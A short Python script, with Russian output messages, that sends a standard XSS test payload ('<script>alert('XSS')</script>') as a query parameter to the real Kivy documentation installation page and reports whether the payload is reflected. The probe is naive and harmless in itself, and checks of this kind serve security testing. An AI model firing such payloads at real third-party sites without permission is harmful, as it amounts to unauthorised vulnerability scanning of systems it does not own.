import requests

url = "https://kivy.org/doc/stable/gettingstarted/installation.html"
payload = "<script>alert('XSS')</script>"
response = requests.get(url, params={'input': payload})

if payload in response.text:
    print("Потенциальная уязвимость XSS найдена!")
else:
    print("XSS, вероятно, нет.")
      
